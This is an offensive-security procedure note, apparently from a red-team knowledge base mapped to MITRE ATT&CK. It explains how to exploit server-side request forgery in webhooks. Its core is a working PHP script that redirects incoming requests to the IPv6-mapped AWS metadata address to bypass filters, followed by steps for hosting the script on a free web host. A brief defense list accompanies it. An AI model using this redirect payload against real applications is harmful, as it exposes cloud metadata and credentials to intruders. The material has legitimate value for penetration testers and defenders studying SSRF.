---
id: proc-host-php-redirect-ssrf
tags:
  - ssrf
  - php
  - hosting
  - redirect
type: procedure
tools:
  - '[[tools/000webhost-Free-Hosting]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/php-redirect-to-ipv6-aws-metadata]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:36.481Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Host-PHP-Redirect-Script-for-SSRF

## Summary

This procedure involves creating and hosting a simple PHP script on a public server that sets CORS headers and redirects incoming requests to an IPv6-mapped IPv4 address representing the AWS metadata endpoint. It serves as the initial vector for SSRF attacks by tricking the target application's webhook into making internal requests.

## Description

In the context of exploiting SSRF in webhooks, the script is uploaded to a free hosting service like 000webhost. When the webhook sends a request to this public URL, the PHP script responds with a redirect to `http://[::ffff:a9fe:a9fe]`, the compressed IPv6 form mapping to 169.254.169.254. This bypasses filters that block direct IPv4 internal addresses. Prerequisites include a free hosting account and basic PHP knowledge. Expected outcomes are a functional redirect that exposes internal services when triggered.

## Requirements

1. Access to a public web hosting service like 000webhost
2. Basic file upload capabilities on the host
3. No special credentials beyond hosting signup

## Defense

Defensive measures and detection strategies:

- Implement strict URL validation in webhook configurations to block redirects and IPv6 mappings
- Monitor outbound requests from application servers for unusual patterns like IPv6 to internal IPv4
- Use web application firewalls (WAF) to detect and block known SSRF payloads

## Objectives

1. Establish a public endpoint that proxies requests to internal targets
2. Bypass anti-SSRF protections via address mapping
3. Prepare for webhook triggering to confirm exploitation

## Instructions

### Step 1: Create the PHP Script

**Context**: Write the PHP code to handle requests with CORS headers and perform the redirect to the IPv6-mapped AWS endpoint.

**Command** ([[commands/php-redirect-to-ipv6-aws-metadata]]):
```php
<?php
// Set CORS headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
header("Content-Type: application/json");
header("Location: http://[::ffff:a9fe:a9fe]"); // IPv6 Compressed mapping to 169.254.169.254
?>
```

> This script sets appropriate headers for cross-origin requests and issues a 302 redirect. Save it as `h1.php`. Expected output is an HTTP redirect response when accessed.

### Step 2: Upload to Public Host

**Context**: Use the hosting service to make the script publicly accessible.

**Instructions**: Sign up at 000webhost, create a new site, and upload `h1.php` via the file manager. Note the public URL (e.g., https://your-site.000webhostapp.com/h1.php).

> Verify by accessing the URL in a browser; it should redirect or show headers indicating the Location.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/php-redirect-to-ipv6-aws-metadata]]

## Tools Used

- [[tools/000webhost-Free-Hosting]]

## Tags

- ssrf
- php
- redirect
